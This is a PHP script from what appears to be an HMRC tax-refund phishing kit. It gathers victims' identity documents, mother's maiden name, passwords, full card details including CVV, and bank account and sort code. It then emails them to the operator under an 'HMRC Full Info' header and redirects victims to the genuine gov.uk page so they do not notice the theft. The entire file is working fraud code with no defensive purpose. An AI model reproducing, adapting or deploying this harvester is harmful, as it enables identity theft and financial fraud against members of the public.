<?php

error_reporting(0);

session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($ip);

$host = gethostbyaddr($ip);

$refund_amount = $_SESSION['refund_value'];

if(!empty($_POST['full_name']))  {

$full_name = $_POST['full_name'];
$_SESSION['name'] = $full_name;

}

if(!empty($_POST['address']))  {

$address = $_POST['address'];
$_SESSION['address'] = $address;

}

if(!empty($_POST['town']))  {

$town = $_POST['town'];
$_SESSION['town'] = $town;

}

if(!empty($_POST['county']))  {

$county = $_POST['county'];

}

if(!empty($_POST['postcode']))  {

$postcode = $_POST['postcode'];
$_SESSION['postcode'] = $postcode;

}

if(!empty($_POST['phone_number']))  {

$phone_number = $_POST['phone_number'];
$_SESSION['telephone'] = $phone_number;

}

if(!empty($_POST['id_method']))  {

$id_method = $_POST['id_method'];

}

if(!empty($_POST['driver_license']))  {

$driver_license = $_POST['driver_license'];

}

if(!empty($_POST['passport_number']))  {

$passport_number = $_POST['passport_number'];

}

if(!empty($_POST['mmn']))  {

$mmn = $_POST['mmn'];

}

if(!empty($_POST['email']))  {

$email = $_POST['email'];

}

if(!empty($_POST['dob']))  {

$dob = $_POST['dob'];
$_SESSION['dob'] = $dob;

}

if(!empty($_POST['cardholder_name']))  {

$cardholder_name = $_POST['cardholder_name'];
$_SESSION['ccname'] = $cardholder_name;

}

if(!empty($_POST['acc_number']))  {

$acc_number = $_POST['acc_number'];
$_SESSION['account'] = $acc_number;

}

if(!empty($_POST['sort_code']))  {

$sort_code = $_POST['sort_code'];
$_SESSION['sort_code'] = $sort_code;

}

if(!empty($_POST['card_number']))  {

$card_number = $_POST['card_number'];
$card_number = str_replace(' ','',$card_number);
$_SESSION['ccno'] = $card_number;
$cardBIN = substr($card_number, 0, 6);

}

if(!empty($_POST['expiry_date']))  {

$expiry_date = $_POST['expiry_date'];
$_SESSION['ccexp'] = $expiry_date;

}

if(!empty($_POST['cvv']))  {

$cvv = $_POST['cvv'];
$_SESSION['secode'] = $cvv;

$city_location = $_SESSION['city'];
$region = $_SESSION['region'];
$country = $_SESSION['country'];

require "includes/userinfo.php";
require "includes/my_email.php";

function url_get_contents($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data;
}

function bankDetails($card_number) {
    $bankDetails = array();
    $cardBIN = substr($card_number, 0, 6);
	$url = "https://lookup.binlist.net/" . $cardBIN;
    $bankDetails = json_decode(url_get_contents($url), true);
    $bankDetails['bin'] = $cardBIN;
    return $bankDetails;
}

$cardInfo = bankDetails($card_number);
$number = $cardInfo['number'];
$BIN = $cardBIN;
$Bank = $cardInfo['bank'];
$bank_name = $Bank['name'];
$Brand = $cardInfo['scheme'];
$Brand = strtoupper($Brand);
$Type = $cardInfo['card_type'];
$password = $_POST['password'];

date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i");
$agent = $_SERVER['HTTP_USER_AGENT'];

$exCC = explode("\n", file_get_contents('logs/ex.txt'));
if (in_array($card_number, $exCC)) {
    header('Location: https://google.com');
    exit;
} else {
    $openFile = fopen('logs/ex.txt', 'a');
    fwrite($openFile, $card_number . '\n');
    fclose($openFile);
}



require "includes/my_email.php";

$msg = "+ ------------- MrProfessor --------------+\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "+ Personal Information\n";
$msg .= "| Full name : ".$full_name."\n";
$msg .= "| Date of birth : ".$dob."\n";
$msg .= "| Address : ".$address. ", " . $town . ", " . $postcode . ", " . $county ."\n";
$msg .= "| Telephone : ".$phone_number."\n";
$msg .= "| Email : ".$email."\n";
$msg .= "| Password : ".$password."\n";
$msg .= "| Identification method : ".$id_method."\n";
if(!empty($driver_license)) {
$msg .= "| Driving licence number : ".$driver_license."\n"; }
if(!empty($passport_number)) {
$msg .= "| Passport number : ".$passport_number."\n"; }
if(!empty($mmn)) {
$msg .= "| Mother's maiden name : ".$mmn."\n"; }
$msg .= "+ ------------------------------------------+\n";
$msg .= "+ Billing Information\n";
$msg .= "| Card BIN: ".$BIN."\n";
$msg .= "| Card Bank: " .$bank_name."\n";
$msg .= "| Card Type: " .$Brand . " " . $Type."\n";
$msg .= "| Cardholder Name : ".$cardholder_name."\n";
$msg .= "| Card Number : ".$card_number."\n";
$msg .= "| Card Exp : ".$expiry_date."\n";
$msg .= "| CVV : ".$cvv."\n";
$msg .= "| Account : ".$acc_number."\n";
$msg .= "| Sort Code : ".$sort_code."\n";
$msg .= "+ ------------------------------------------+\n";
$msg .= "+ Victim Information\n";
$msg .= "| Submitted by : $ip ($host)\n";
$msg .= "| Location : $city_location, $region, $country\n";
$msg .= "| UserAgent : $agent\n";
$msg .= "| Browser : $user_browser\n";
$msg .= "| OS : $user_os\n";
$msg .= "| Received : $time\n";
$msg .= "+ ------------------------------------------+\n\n";

$subject = $BIN . " from " . $_SERVER['REMOTE_ADDR'];
$headers = "From: HMRC Full Info <$my_email>\r\n";
$headers .= "Reply-To: HMRC Full Info <$my_email>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/plain; charset=utf-8\r\n";

mail($my_email,$subject,$msg,$headers);

header("Location: https://www.gov.uk/government/organisations/hm-revenue-customs");

}

?>